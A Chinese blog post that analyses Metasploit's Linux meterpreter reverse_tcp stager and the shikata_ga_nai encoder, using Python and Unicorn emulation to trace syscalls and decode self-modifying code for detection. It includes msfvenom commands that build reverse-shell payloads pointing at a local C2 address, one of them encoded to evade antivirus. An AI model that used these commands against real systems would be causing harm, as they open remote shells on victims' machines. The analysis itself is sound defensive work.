---
title: 杀软的无奈-metasploit的shellcode分析(三)
url: 1683.html
id: 1683
categories:
  - 学习记录
date: 2021-04-25 19:57:14
tags:
  - 杀软的无奈
---


## 前言

本文主要是通过编写一些自动化的工具来分析metepreter生成的linux平台的shellcode loader，以及解释一些常用的编码器的工作过程。

**本文使用的工具是 unicorn，官方版本没有执行SMC代码的能力(已经在修了)，推荐暂时使用个人patch版本[https://github.com/wonderkun/unicorn](https://github.com/wonderkun/unicorn)**


<!-- more -->

## 无编码器的metepreter shellcode loader

首先生成一个metepreter后门，然后用IDA分析一下。


```bash
msfvenom  -p  linux/x64/meterpreter/reverse_tcp  LHOST=192.168.7.34 LPORT=4444  -f elf > tese.elf
```

ida看一下生成的代码如下：

![](https://pic.wonderkun.cc/uploads/2021/04/2021-04-25-11-38-48.png)

ida虽然对一些syscall进行了注释，但是rax被动态赋值的时候调用syscall，IDA就无能为力了，所以接下来要基于unicorn写模拟执行工具，来进行分析。

### 0x01 加载ELF文件

首先先来解析ELF文件，获取可执行的segment的代码，进行加载。这一步不一定有必要做，因为你可以直接模拟执行shellcode，也可以使用IDApython直接提取代码来分析。但是我还是希望能够直接分析ELF文件，并且不依赖于IDA的辅助，所以从最基础的部分开始做起。

```python

class ELF(object):

	def __init__(self,path):
		self.path = path
		self.fd = open(self.path,"rb") 

	def delete(self):
		# 需要手工调用，否则会产生文件占用
		if self.fd:
			self.fd.close()

	def getFileHeader(self):
		elfhdr = {}
		'''
		#define EI_NIDENT       16

		typedef struct {
				unsigned char   e_ident[EI_NIDENT]; 
				Elf32_Half      e_type;
				Elf32_Half      e_machine;
				Elf32_Word      e_version;
				Elf32_Addr      e_entry;
				Elf32_Off       e_phoff;
				Elf32_Off       e_shoff;
				Elf32_Word      e_flags;
				Elf32_Half      e_ehsize;
				Elf32_Half      e_phentsize;
				Elf32_Half      e_phnum;
				Elf32_Half      e_shentsize;
				Elf32_Half      e_shnum;
				Elf32_Half      e_shstrndx;
		} Elf32_Ehdr;

		typedef struct {
				unsigned char   e_ident[EI_NIDENT]; 
				Elf64_Half      e_type;
				Elf64_Half      e_machine;
				Elf64_Word      e_version;
				Elf64_Addr      e_entry;
				Elf64_Off       e_phoff;
				Elf64_Off       e_shoff;
				Elf64_Word      e_flags;
				Elf64_Half      e_ehsize;
				Elf64_Half      e_phentsize;
				Elf64_Half      e_phnum;
				Elf64_Half      e_shentsize;
				Elf64_Half      e_shnum;
				Elf64_Half      e_shstrndx;
		} Elf64_Ehdr;
		'''
		
		elfident = self.fd.read(16)
		if len(elfident) !=16:
			return {}
			
		# print( [ ord(i) for i in elfident] )

		magic = [ ord(i) for i in elfident]
		
		if magic[4] == 1:
			# ELF 32
			packStr = "<2H5I6H"
			elfhdr["mode"] = 32

		elif magic[4] == 2:
			# ELF 64
			packStr = "<2HI3QI6H"
			elfhdr["mode"] = 64
		else:
			# Data
			return {}
		temp = self.fd.read(struct.calcsize( packStr ))
		temp = struct.unpack(packStr,temp)

		elfhdr['magic'] = magic
		elfhdr['e_type']= temp[0]
		elfhdr['e_machine'] = temp[1]
		elfhdr['e_version'] = temp[2]
		elfhdr['e_entry'] = temp[3]
		elfhdr['e_phoff'] = temp[4]
		elfhdr['e_shoff'] = temp[5]
		elfhdr['e_flags'] = temp[6]
		elfhdr['e_ehsize'] = temp[7]
		elfhdr['e_phentsize'] = temp[8]
		elfhdr['e_phnum'] = temp[9]
		elfhdr['e_shentsize'] = temp[10]
		elfhdr['e_shnum'] = temp[11]
		elfhdr['e_shstrndx'] = temp[12]
		return elfhdr

	def hasNoSectionInfo(self,elfhdr ):

		if not elfhdr:
			return False
		if elfhdr["e_shoff"] == 0 and \
			elfhdr["e_shnum"] == 0:
			return True
		return False

	# print(elfhdr["e_shoff"])
	# print( elfhdr["e_shnum"] )
	# print( elfhdr["e_shentsize"] )

	def readProgramHeader(self,elfhdr):
		headerSize = elfhdr["e_ehsize"]
		self.fd.seek(headerSize)
		'''
			typedef struct {
				Elf32_Word      p_type;
				Elf32_Off       p_offset;
				Elf32_Addr      p_vaddr;
				Elf32_Addr      p_paddr;
				Elf32_Word      p_filesz;
				Elf32_Word      p_memsz;
				Elf32_Word      p_flags;
				Elf32_Word      p_align;
			} Elf32_Phdr;

			typedef struct {
				Elf64_Word      p_type;
				Elf64_Word      p_flags;
				Elf64_Off       p_offset;
				Elf64_Addr      p_vaddr;
				Elf64_Addr      p_paddr;
				Elf64_Xword     p_filesz;
				Elf64_Xword     p_memsz;
				Elf64_Xword     p_align;
			} Elf64_Phdr;
		'''

		if elfhdr["mode"] == 32:
			packStr = "<8I"
		elif elfhdr["mode"] == 64:
			packStr = "<2I6Q"

		phentsize = elfhdr["e_phentsize"]
		phnum = elfhdr["e_phnum"]

		if struct.calcsize( packStr ) != phentsize :
			return []

		assert( phnum >= 1 )

		phHeaders = []
		for i in range(phnum):
			# 循环读取所有的段表
			phHeader = {}
			temp = self.fd.read(struct.calcsize( packStr ))
			if struct.calcsize( packStr ) != len(temp):
				continue

			temp = struct.unpack(packStr,temp)

			if elfhdr["mode"] == 32:
				phHeader["p_type"] = temp[0]
				phHeader["p_offset"] = temp[1]
				phHeader["p_vaddr"] = temp[2]
				phHeader["p_paddr"] = temp[3]
				phHeader["p_filesz"] = temp[4]
				phHeader["p_memsz"] = temp[5]
				phHeader["p_flags"] = temp[6]
				phHeader["p_align"] = temp[7]

			elif elfhdr["mode"] == 64:
				phHeader["p_type"] = temp[0]
				phHeader["p_flags"] = temp[1]
				phHeader["p_offset"] = temp[2]
				phHeader["p_vaddr"] = temp[3]
				phHeader["p_paddr"] = temp[4]
				phHeader["p_filesz"] = temp[5]
				phHeader["p_memsz"] = temp[6]
				phHeader["p_align"] = temp[7]
			phHeaders.append( phHeader )

		return phHeaders
	
	def getFirstCode(self,elfhdr,phHeaders):
		# 读取第一个 包含入口地址 并且可加载，可执行的段的数据
		entryPoint = elfhdr["e_entry"]
		PT_LOAD = 1

		PF_X = 0x1 
		PF_W = 0x2
		PF_R = 0x4

		firstPh = None
		# print(phHeaders)
		
		for  phHeader in phHeaders:
			if not ( entryPoint >= phHeader["p_vaddr"] and entryPoint < (phHeader["p_vaddr"]+phHeader["p_filesz"]) ):
				continue

			if phHeader["p_type"] == PT_LOAD and\
				(phHeader["p_flags"] & (PF_X)):

				# rwx
				firstPh = phHeader

		# print(firstPh)

		if firstPh:
			fileOff = entryPoint - firstPh["p_vaddr"] + phHeader["p_offset"]
			size = phHeader["p_filesz"] - ( entryPoint - firstPh["p_vaddr"] )
			
			if fileOff < 0  or size < 0 :
				# invalid entry point
				return None,None

			self.fd.seek(fileOff)
			imageBase = firstPh["p_vaddr"]

			return imageBase,self.fd.read( size )

		return None,None

```

然后从entryPoint开始进行模拟执行。

```python

class SimpleEngine:
	def __init__(self, mode):
		if mode == 32:
			cur_mode = CS_MODE_32
		elif mode == 64:
			cur_mode = CS_MODE_64
		else:
			cur_mode = CS_MODE_16

		self.capmd = Cs(CS_ARCH_X86, cur_mode)

	def disas_single(self, data, addr):
		for i in self.capmd.disasm(data, addr):
			print("  0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))
			break

	def disas_all(self, data, addr):
		for i in self.capmd.disasm(data, addr):
			print("  0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))

def hook_code(uc, addr, size, user_data):
	mem = uc.mem_read(addr, size)
	uc.disasm.disas_single(mem, addr)

	# if debug:
	# 	print("r10:{}".format( hex(uc.reg_read( UC_X86_REG_R10 ) ) ))
	# 	print("rcx:{}".format( uc.reg_read( UC_X86_REG_RCX ) ) )
	# 	print("rdx:{}".format( uc.reg_read( UC_X86_REG_RDX ) ) )
	return True

def main(bin_code,mode,imageBase,entryPoint,max_instruction=0):
	global write_bounds
	global debug

	debug = True

	tags = []
	write_bounds = [None, None]

	disas_engine = SimpleEngine(mode)

	if mode == 32:
		cur_mode = UC_MODE_32
	elif mode == 64:
		cur_mode = UC_MODE_64
	else:
		cur_mode = UC_MODE_16
	
	PAGE_SIZE = 6 * 1024 * 1024
	START_RIP = entryPoint

	# setup engine and write the memory there.
	emu = Uc(UC_ARCH_X86, cur_mode)
	emu.disasm = disas_engine # python is silly but it works.
	
	# print( hex(imageBase),PAGE_SIZE,mode )
	
	emu.mem_map(imageBase, PAGE_SIZE)
	# write machine code to be emulated to memory
	emu.mem_write(START_RIP, bin_code)

	# write a INT 0x3 near the end of the code blob to make sure emulation ends
	emu.mem_write(START_RIP + len(bin_code) + 0xff, b"\xcc\xcc\xcc\xcc")

	if debug:
		# emu.hook_add(UC_HOOK_MEM_READ, hook_mem_read)
		emu.hook_add(UC_HOOK_CODE, hook_code)

	# arbitrary address for ESP.
	stackBase = imageBase + PAGE_SIZE - 1*1024 * 1024

	emu.reg_write(UC_X86_REG_ESP,stackBase)

	if max_instruction:
		end_addr = -1
	else:
		max_instruction = 0x1000
		end_addr = len(bin_code)

	try: 
		emu.emu_start(START_RIP, end_addr, 0, int(max_instruction))
	# except UC_ERR_READ_UNMAPPED as e:
	# 	# print("ERROR: %s" % e)
	# 	pass
	except UcError as e:
		if e.errno != UC_ERR_READ_UNMAPPED:
			print("ERROR: %s" % e)
		else:
			if debug:
				print("rcx:{}".format( emu.reg_read( UC_X86_REG_RCX ) ) )
				print("rbp:{}".format( emu.reg_read( UC_X86_REG_RBP ) ) ) 
```

执行一下，就可以dump出来当前分支的所有代码，但是现在还并没有处理syscall，接下里需要添加syscall的hook，来dump syscall的参数来方便分析。

### 0x02 syscall 参数的处理

x86_64 的syscall调用的系统调用号、参数、和系统调用号可以参考文档 [https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)。

接下里进行 syscall的hook，编写如下类：

```python
class HookSyscall(object):

	def __init__(self):
		self.c2Server = None
		self.protectAddr = 0
		self.writeAddr = 0 
		self.addrLen = 0

		self.dupList = set() # dup2

	def ip2Str(self,num):
		s = []
		for i in range(4):
			s.append(str( num%256 ))
			num //= 256
		return '.'.join(s[::-1])
  
	def __call__(self,uc,user_data):
	# pass
		rax = uc.reg_read(UC_X86_REG_RAX)
		rdi = uc.reg_read(UC_X86_REG_RDI)
		rsi = uc.reg_read(UC_X86_REG_RSI)
		rdx = uc.reg_read(UC_X86_REG_RDX)
		r10 = uc.reg_read(UC_X86_REG_R10)
		r8 = uc.reg_read(UC_X86_REG_R8)
		r9 = uc.reg_read(UC_X86_REG_R9)

		if debug:
			print( "[*] rax:\t{},rdi:\t{},rsi:\t{},rdx:\t{},r10:\t{}".format(  
				hex(rax),rdi,rsi,rdx,r10
			) )

		if rax == 0x09:
			# # syscall mmap
			# if debug:
			# 	print("[-] mmap")
			PROT_EXEC = 0x04
			PROT_WRITE = 0x02

			if rdx & PROT_EXEC and rdx & PROT_WRITE:
				# 返回一个地址					
				rip = uc.reg_read(UC_X86_REG_RIP)
				self.protectAddr =  (rip >> 12 << 12) + 4*0x1000
				self.addrLen = rsi

				if debug:
					print("[-] mmap size: {},permit: {} , addr: {} ".format( rsi,rdx & 0b111,self.protectAddr ))

				uc.reg_write(UC_X86_REG_RAX,self.protectAddr)
			
			return

		if rax == 0x2b:
			if debug:
				print("[-] listen")

			uc.reg_write(UC_X86_REG_RAX,0)
			return

		if rax == 0x29:
			if debug:
				print("[-] socket")
			
			return

		if rax == 0x21:
			if debug:
				print("[-] dup2 , {}->{}".format( rdi, rsi)) 
			self.dupList.add( rsi )


		if rax == 0x2a or rax == 0x31:
			if debug:
				print("[-] connect or bind!")
			sockaddr_in_addr = rsi
			
			sockaddr_in_str = ">2HI"		
			tmp = uc.mem_read(sockaddr_in_addr, struct.calcsize(sockaddr_in_str) )
			sockaddr_in = struct.unpack(sockaddr_in_str,tmp)
			# print(tmp)

			uc.reg_write(UC_X86_REG_RAX,0x0)

			# print(sockaddr_in)
			
			port  = sockaddr_in[1]
			addr = self.ip2Str(sockaddr_in[2])

			if debug:
				print("[-] c2 Server {}:{}".format( addr,port ))
			self.c2Server = "{}:{}".format(addr,port)

			return

		if rax == 0x00:
			print("[-] read")
			self.writeAddr = rsi

			uc.reg_write(UC_X86_REG_RAX,0)
			return
		
		# if rax ==

		uc.reg_write(UC_X86_REG_RAX,0)

		return True
```

添加hook:

```python

hookSyscall = HookSyscall()
emu.hook_add(UC_HOOK_INSN, hookSyscall, None, 1, 0, UC_X86_INS_SYSCALL)
```

然后运行，就可以看到监控到的syscall参数：

```log

0x40008d:     syscall
[*] rax:        0x9L,rdi:       0,rsi:  4096,rdx:       4103,r10:       34
[-] mmap size: 4096,permit: 7 , addr: 4210688 

...

0x4000a3:     syscall
[*] rax:        0x29L,rdi:      2,rsi:  1,rdx:  0,r10:  34
[-] socket

...

0x4000c0:     syscall
[*] rax:        0x2aL,rdi:      41,rsi: 9437168,rdx:    16,r10: 34
[-] connect or bind!
[-] c2 Server 192.168.7.34:4444

...

0x4000f1:     syscall
[*] rax:        0x0L,rdi:       41,rsi: 4210688,rdx:    126,r10:        34
[-] read
0x4000f3:     test    rax, rax
0x4000f6:     js      0x4000e5
0x4000f8:     jmp     rsi

```

可以看到加载远程的shellcode主要分为五个步骤:

```
1. mmap 申请一块rwx权限的内存空间,地址为A 
2. socket  创建一个socket
3. connect 连接一个socket
4. read 读取远程数据写到A
5. jmp A 执行代码
```

整个过程还是比较简单的。


## 编码器的执行分析

metepreter 的二进制编码器都是使用SMC代码来实现恶意代码的隐藏，本文使用效果excellent的编码器 `x86/shikata_ga_nai` 进行示例，接下里的代码一定要使用我patch过的unicorn才能获得预期的效果。

```bash
msfvenom  -p  linux/x64/meterpreter/reverse_tcp  LHOST=192.168.7.34 LPORT=4444 -e x86/shikata_ga_nai -i 1  -f elf > tese_encoder.elf
```

看一下生成的代码:

![](https://pic.wonderkun.cc/uploads/2021/04/2021-04-25-14-28-06.png)

很明显: 
```
LOAD:000000000040007D                 fcmovb  st, st(2)
LOAD:000000000040007F                 fnstenv [rsp+var_C]
LOAD:0000000000400083                 pop     rbx
```

获取了下一条指令的地址(当前的RIP)存储在了rbx中，然后调整偏移和esi异或来进行代码修改：

```bash
LOAD:0000000000400084                 sub     ecx, ecx
LOAD:0000000000400086                 mov     cl, 21h ; '!'
LOAD:0000000000400088                 sub     ebx, 0FFFFFFFCh
LOAD:000000000040008B                 xor     [rbx+10h], esi
```
经过测试，此编码器每次生成的密钥都不同，也就是这条指令`mov esi, 0EF034529h`，剩下的流程都是一样的，包括需要解密的长度，一直都是 `mov cl, 21h`。

仅依靠静态来识别此编码器还是比较简单的，但是想要识别编码器的混用或者自定义的编码器，静态可能就力不从心了，所以我们下面写代码来识别出这种自修改代码。

```python
# 添加如下hook函数
emu.hook_add(UC_HOOK_MEM_WRITE, hook_smc_check)


write_bounds = [None, None]

def hook_smc_check(uc, access, address, size, value, user_data):
	SMC_BOUND = 0x200
	rip = uc.reg_read(UC_X86_REG_RIP)

	# Just check if the write target addr is near EIP
	if abs(rip - address) < SMC_BOUND:
		if write_bounds[0] == None:
			write_bounds[0] = address
			write_bounds[1] = address
		elif address < write_bounds[0]:
			write_bounds[0] = address
		elif address > write_bounds[1]:
			write_bounds[1] = address


if write_bounds[0] != None:
  # print("Shellcode address ranges:")
  # print("   low:  0x%X" % write_bounds[0])
  # print("   high: 0x%X" % write_bounds[1])
  # print("")
  # print("Decoded shellcode:")
  mem = emu.mem_read(write_bounds[0], (write_bounds[1] - write_bounds[0]))
  emu.disasm.disas_all(mem, write_bounds[0])

```

这样就会完整的dump修改之后的代码，这个修改后的代码和之前生成的代码是相同的。x86系统调用的是`int 80`中断，其实原理都是一样的， 所以不再赘述。到这里基本的原理和代码都已经讲完了，随便自己再完善一下就可以实现metasploit生成的后门的模拟执行检测了。

